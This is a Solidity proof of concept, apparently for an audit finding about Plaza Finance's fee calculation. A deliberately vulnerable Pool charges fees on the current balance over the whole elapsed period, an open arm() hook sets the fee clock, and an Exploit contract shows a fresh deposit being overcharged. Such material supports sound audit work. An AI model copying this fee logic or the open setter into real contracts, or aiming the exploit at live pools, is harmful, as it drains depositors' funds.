// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Plaza Finance — H-8 (Sherlock 2024-12, issue 842)
    getFeeAmount multiplies the current reserve balance by the full time
    since lastFeeClaimTime. A 1000 token deposit at the end of a year in
    which the pool held 10 is charged as if 1010 sat there all year.
    fee = 1e16 (1%) and PRECISION = 1e18, so the beneficiary takes 10.10
    instead of 0.10. The extra 10 tokens come out of the fresh deposit. */

contract Token {
    string public symbol = "rTKN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    uint256 private locked = 1;
    modifier nonReentrant() {
        require(locked == 1, "reentrancy");
        locked = 2;
        _;
        locked = 1;
    }

    uint256 public constant PRECISION = 1e18;
    uint256 public constant SECONDS_PER_YEAR = 365 days;
    uint256 public fee = 1e16;
    Token public reserveToken;
    address public feeBeneficiary;
    uint256 public lastFeeClaimTime;

    constructor(Token token, address beneficiary) {
        reserveToken = token;
        feeBeneficiary = beneficiary;
    }

    function create(uint256 amount) external {
        require(reserveToken.transferFrom(msg.sender, address(this), amount), "pull"); // [S3]
    }

    function arm(uint256 elapsed) external {
        require(elapsed <= block.timestamp, "elapsed");
        lastFeeClaimTime = block.timestamp - elapsed; // [S1]
    }

    function claimFees() public nonReentrant {
        require(msg.sender == feeBeneficiary, "NotBeneficiary"); // [S4]
        uint256 feeAmount = getFeeAmount();
        if (feeAmount == 0) revert("NoFeesToClaim");
        lastFeeClaimTime = block.timestamp;
        require(reserveToken.transfer(feeBeneficiary, feeAmount), "fee"); // [S5]
    }

    function getFeeAmount() public view returns (uint256) {
        // @> VULN: [S2] current balance, not the balance that was in the pool over the elapsed year.
        // FIX: call claimFees inside create and redeem, before the balance changes.
        return (reserveToken.balanceOf(address(this)) * fee * (block.timestamp - lastFeeClaimTime)) / (PRECISION * SECONDS_PER_YEAR);
    }
}

contract Lp {
    function approve(Token token, address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function create(Pool pool, uint256 amount) external {
        pool.create(amount);
    }
}

contract Exploit {
    Token public reserveToken; // nonce 1
    Pool public pool; // nonce 2
    Lp public lp; // nonce 3
    uint256 public taken;

    constructor() {
        reserveToken = new Token();
        pool = new Pool(reserveToken, address(this));
        lp = new Lp();
        reserveToken.mint(address(pool), 10 ether);
        reserveToken.mint(address(lp), 1000 ether);
        lp.approve(reserveToken, address(pool));
    }

    function run() external {
        pool.arm(365 days);
        lp.create(pool, 1000 ether);
        pool.claimFees(); // [S6]
        taken = reserveToken.balanceOf(address(this));
        require(taken == 10.1 ether, "charged 10.10 for a 10-token year");
        require(taken - 0.1 ether == 10 ether, "10 token overcharge");
    }

    /// Control: accrue on the 10 token balance, then deposit. The second claim sees dt = 0.
    function runAccruedFirst() external {
        pool.arm(365 days);
        pool.claimFees();
        uint256 fair = reserveToken.balanceOf(address(this));
        lp.create(pool, 1000 ether);
        require(fair == 0.1 ether, "fair fee is 0.10");
        require(pool.getFeeAmount() == 0, "deposit does not owe a year of fees");
    }
}
